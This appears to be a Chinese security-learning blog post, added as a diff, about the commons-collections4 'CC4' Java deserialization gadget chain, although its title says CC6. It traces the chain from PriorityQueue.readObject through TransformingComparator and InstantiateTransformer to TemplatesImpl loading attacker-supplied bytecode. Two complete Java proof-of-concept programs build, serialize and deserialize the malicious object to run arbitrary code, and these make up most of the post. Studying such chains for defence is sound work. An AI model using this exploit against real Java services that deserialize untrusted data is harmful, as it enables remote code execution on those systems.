@@ -1,0 +1,185 @@
+---
+layout: post
+title: CC链-CC6
+subtitle: Let's start learning!
+tags: [CC链]
+author: Sine
+---
+
+# CC4
+
+CC4是针对commons-collections4版本的攻击链
+
+PriorityQueue.readObject()->PriorityQueue.heapify()->PriorityQueue.siftDown()->PriorityQueue.siftDownUsingComparator()->TransformingComparator.compare()->ChainedTransformer.transform()->ConstantTransformer.transform()->InstantiateTransformer.transform()->TrAXFilter.TrAXFilter()->TemplatesImpl.newTransformer()->TemplatesImpl.getTransletInstance()->TemplatesImpl.defineTransletClasses()->ClassLoader.defineClass()->newInstance()
+
+我们直接来看TransformingComparator中的compare方法调用了transform方法
+
+![image-20250213213529995](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213213530024.png)
+
+this.transform在构造函数里被赋值
+
+![image-20250213213634040](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213213634095.png)
+
+TransformingComparator.compare在PriorityQueue.siftDownUsingComparator中被调用
+
+![image-20250213213710644](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213213710678.png)
+
+comparator在构造函数里被赋值，this.comparator = comparator
+
+![image-20250218203046661](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218203046812.png)
+
+siftDownUsingComparator被siftDown调用
+
+![image-20250213213811111](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213213811146.png)
+
+siftDown被heapify调用
+
+![image-20250213213844021](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213213844085.png)
+
+heapify在本类的readObject方法中调用
+
+![image-20250213213906874](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213213906955.png)
+
+前半部分可采用CC3，初始化TransformingComparator，传入chainedTransformer赋值给this.transform
+
+再把TransformingComparator传入PriorityQueue进行初始化，PriorityQueue的成员变量this.comparator即为TransformingComparator，再调用TransformingComparator.compare方法
+
+然后在compare方法里会调用chainedTransformer.transform方法
+
+在heapify中，要满足i = (size >>> 1) - 1>= 0才能调用siftDown方法，所以要使size>2
+
+![image-20250213220033214](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250213220033254.png)
+
+所以要往priorityQueue中add至少两个对象
+
+此时，还未进行序列化反序列化，但也能够执行
+
+```java
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+
+public class CC4Test {
+
+    public static void main(String[] args) throws NoSuchFieldException, IllegalAccessException, IOException {
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates,"123");
+        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        byte [] code = Files.readAllBytes(Paths.get("/Users/sine/Desktop/code/Java/untitled1/target/classes/org/example/Test.class"));
+        byte[][] codes = {code};
+        bytecodesField.set(templates,codes);
+        Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
+        _tfactoryField.setAccessible(true);
+        _tfactoryField.set(templates,new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class},new Object[]{templates})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);
+        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
+        priorityQueue.add(1);
+        priorityQueue.add(2);
+    }
+
+}
+```
+
+![image-20250218212120658](https://blogandnotebucket.oss-cn-hangzhou.aliyuncs.com/blog/20250218212120705.png)
+
+priorityQueue.add方法也会调用到siftUpUsingComparator()->compare，所以可以先在transformingComparator初始化时传入一个无用的对象赋值给this.transform，等到add结束后，再修改transformingComparator成员变量transform的值
+
+```JAVA
+package org.example;
+
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.functors.ConstantTransformer;
+import org.apache.commons.collections4.functors.InstantiateTransformer;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.ChainedTransformer;
+
+import javax.xml.transform.Templates;
+import java.io.*;
+import java.lang.reflect.Field;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.PriorityQueue;
+
+
+public class CC4Test {
+
+    public static void main(String[] args) throws Exception {
+
+        TemplatesImpl templates = new TemplatesImpl();
+        Class templatesClass = templates.getClass();
+        Field nameField = templatesClass.getDeclaredField("_name");
+        nameField.setAccessible(true);
+        nameField.set(templates, "123");
+        Field bytecodesField = templatesClass.getDeclaredField("_bytecodes");
+        bytecodesField.setAccessible(true);
+        byte[] code = Files.readAllBytes(Paths.get("/Users/sine/Desktop/code/Java/untitled1/target/classes/org/example/Test.class"));
+        byte[][] codes = {code};
+        bytecodesField.set(templates, codes);
+        Field _tfactoryField = templatesClass.getDeclaredField("_tfactory");
+        _tfactoryField.setAccessible(true);
+        _tfactoryField.set(templates, new TransformerFactoryImpl());
+
+        Transformer[] transformers = new Transformer[]{
+                new ConstantTransformer(TrAXFilter.class),
+                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
+        };
+        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
+        TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1));
+        PriorityQueue priorityQueue = new PriorityQueue<>(transformingComparator);
+        priorityQueue.add(1);
+        priorityQueue.add(2);
+        Class transformingComparatorClass = transformingComparator.getClass();
+        Field transformField = transformingComparatorClass.getDeclaredField("transformer");
+        transformField.setAccessible(true);
+        transformField.set(transformingComparator, chainedTransformer);
+
+        serialize(priorityQueue);
+        unserialize("ser.bin");
+    }
+        public static void serialize(Object obj) throws Exception {
+            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
+            oos.writeObject(obj);
+        }
+
+        public static Object unserialize(String Filename) throws Exception {
+            ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+            Object obj = ois.readObject();
+            return obj;
+        }
+
+
+    }
+```
+
+![image-20250218212155226](/Users/sine/Library/Application Support/typora-user-images/image-20250218212155226.png)
+
+# 
